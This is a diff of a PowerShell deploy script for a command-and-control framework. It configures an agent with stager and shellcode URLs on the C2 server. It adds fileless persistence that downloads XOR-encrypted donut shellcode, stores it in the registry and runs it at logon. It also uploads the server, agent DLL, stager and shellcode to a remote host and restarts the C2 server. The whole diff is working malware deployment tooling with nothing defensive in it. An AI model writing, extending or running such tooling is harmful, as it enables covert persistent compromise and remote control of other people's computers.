@@ -10,12 +10,12 @@
 #
 # Usage:
 #   .\deploy.ps1
-#   .\deploy.ps1 -Ip 45.154.98.72 -Port 4444 -ApiPort 5555
+#   .\deploy.ps1 -Ip 192.168.2.7 -Port 4444 -ApiPort 5555
 #   .\deploy.ps1 -SkipAgent     # rebuild only server
 #   .\deploy.ps1 -SkipServer    # rebuild only agent
 
 param(
-    [string]$Ip        = "45.154.98.72",
+    [string]$Ip        = "192.168.2.7",
     [int]   $Port      = 4444,
     [int]   $ApiPort   = 5555,
     [string]$VpsUser   = "root",
@@ -76,6 +76,11 @@ if (-not $SkipAgent) {
     $stagerUrl = "http://${Ip}:${ApiPort}/api/stage0/ester"
     $configContent += "`n/// URL from which the stager (ester.exe) is served by the C2 server.`n"
     $configContent += "/// Used by fileless scheduled-task persistence to download & re-exec the agent from memory.`npub const STAGER_URL: &str = `"${stagerUrl}`";`n"
+
+    $shellcodeUrl = "http://${Ip}:${ApiPort}/api/stage0/ester.sc"
+    $configContent += "`n/// URL from which donut-processed PIC shellcode is served (XOR-encrypted in transit).`n"
+    $configContent += "/// Used by auto-persist to download shellcode -> store encrypted in registry -> native loader on logon.`npub const SHELLCODE_URL: &str = `"${shellcodeUrl}`";`n"
+
     [System.IO.File]::WriteAllText("$RepoRoot\agent\src\config.rs", $configContent)
     Write-Host "  config.rs -> ${Ip}:${Port}" -ForegroundColor DarkGray
 
@@ -147,7 +152,7 @@ $SshOpts = @("-o", "ConnectTimeout=20", "-o", "BatchMode=yes", "-o", "StrictHost
 # Decide what to transfer
 $filesToServe = @()
 if (-not $SkipServer) { $filesToServe += "c2r2-server-x86_64" }
-if (-not $SkipAgent)  { $filesToServe += "agent.dll"; $filesToServe += "ester.exe" }
+if (-not $SkipAgent)  { $filesToServe += "agent.dll"; $filesToServe += "ester.exe"; if (Test-Path (Join-Path $DistDir "ester.sc")) { $filesToServe += "ester.sc" } }
 if ($filesToServe.Count -eq 0) { Die "Nothing to deploy (-SkipAgent and -SkipServer both set)" }
 
 # Pick a random high port for the local HTTP server (avoids conflicts)
@@ -173,13 +178,14 @@ foreach ($f in $filesToServe) {
         "c2r2-server-x86_64" { '~/c2r2/c2r2-server' }
         "agent.dll"          { '~/c2r2/dist/agent.dll' }
         "ester.exe"          { '~/c2r2/dist/ester.exe' }
+        "ester.sc"           { '~/c2r2/dist/ester.sc' }
     }
     $curlCmds += "curl -fsSL http://127.0.0.1:${HttpPort}/${f} -o ${dest}"
 }
 $curlBlock = $curlCmds -join "`n"
 
 $remoteScript = @"
-set -e
+set -euo pipefail
 mkdir -p ~/c2r2/dist ~/c2r2/logs
 
 # Download files via reverse tunnel
@@ -189,11 +195,13 @@ ${curlBlock}
 chmod +x ~/c2r2/c2r2-server 2>/dev/null || true
 
 # Show sizes
-ls -lh ~/c2r2/c2r2-server ~/c2r2/dist/agent.dll ~/c2r2/dist/ester.exe 2>/dev/null | awk '{print "[ok]", `$5, `$9}'
+ls -lh ~/c2r2/c2r2-server ~/c2r2/dist/agent.dll ~/c2r2/dist/ester.exe ~/c2r2/dist/ester.sc 2>/dev/null | while read -r _ _ _ _ sz _ _ _ name; do echo "[ok] `$sz `$name"; done || true
 
 # Stop old server (tmux session + process)
 tmux kill-session -t c2r2 2>/dev/null || true
-pkill -f 'c2r2-server' 2>/dev/null || true
+# Use pkill -x (exact name) instead of -f (full cmdline) because -f would
+# match the SSH session itself whose command line contains 'c2r2-server'.
+pkill -x 'c2r2-server' 2>/dev/null || true
 sleep 1
 
 # Start server inside a detached tmux session so it keeps running after SSH closes
